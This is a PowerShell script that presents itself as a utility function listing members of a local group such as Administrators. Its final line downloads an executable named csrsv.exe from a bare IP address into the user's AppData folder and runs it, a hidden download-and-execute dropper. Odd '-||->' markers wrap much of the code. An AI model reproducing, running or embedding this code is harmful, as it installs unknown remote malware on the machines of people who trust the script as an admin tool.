 -||-> function Get-LocalGroupMember
{

	[CmdletBinding()]
	PARAM (
		[Parameter(ValueFromPipeline = $true,
				   ValueFromPipelineByPropertyName = $true)]
		[System.String[]]$ComputerName = $env:COMPUTERNAME,
		[System.String]$GroupName = "Administrators"
	)
	BEGIN
	{
		 -||-> TRY
		{
			 -||-> Add-Type -AssemblyName System.DirectoryServices.AccountManagement -ErrorAction 'Stop' -ErrorVariable ErrorBeginAddType <-||- 
			 -||-> $ctype = [System.DirectoryServices.AccountManagement.ContextType]::Machine <-||- 
		}
		CATCH
		{
			 -||-> Write-Warning -Message "[BEGIN] Something wrong happened" <-||- 
			 -||-> IF ( -||-> $ErrorBeginAddType <-||- ) {  -||-> Write-Warning -Message "[BEGIN] Error while loading the Assembly: System.DirectoryServices.AccountManagement" <-||-  } <-||- 
			 -||-> Write-Warning -Message $Error[0].Exception.Message <-||- 
		} <-||- 
	}
	PROCESS
	{
		 -||-> FOREACH ($Computer in  -||-> $ComputerName <-||- )
		{
			 -||-> TRY
			{
				 -||-> $context =  -||-> New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ctype, $computer <-||-  <-||- 
				 -||-> $idtype = [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName <-||- 
				 -||-> $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($context, $idtype, $GroupName) <-||- 
				 -||-> $group.Members | Select-Object *, @{ Label =  -||-> 'Server' <-||- ; Expression =  -||-> {  -||-> $computer <-||-  } <-||-  }, @{ Label =  -||-> 'Domain' <-||- ; Expression =  -||-> {  -||-> $_.Context.Name <-||-  } <-||-  } <-||- 
			}
			CATCH
			{
				 -||-> Write-Warning -Message "[PROCESS] Something wrong happened" <-||- 
				 -||-> Write-Warning -Message $Error[0].Exception.Message <-||- 
			} <-||- 
		} <-||- 
	}
} <-||- 
 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



